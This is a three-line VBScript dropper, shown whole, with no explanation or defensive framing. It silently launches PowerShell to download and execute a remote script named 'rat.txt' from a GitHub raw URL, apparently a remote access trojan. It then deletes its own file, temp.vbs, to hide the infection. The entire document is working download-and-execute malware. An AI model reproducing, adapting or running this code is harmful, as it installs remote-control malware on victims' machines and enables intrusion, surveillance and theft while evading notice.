Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell.exe -Command iex (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/NE1W01F/EXE/master/rat.txt');", 0
objShell.Run "cmd.exe /c del temp.vbs", 0
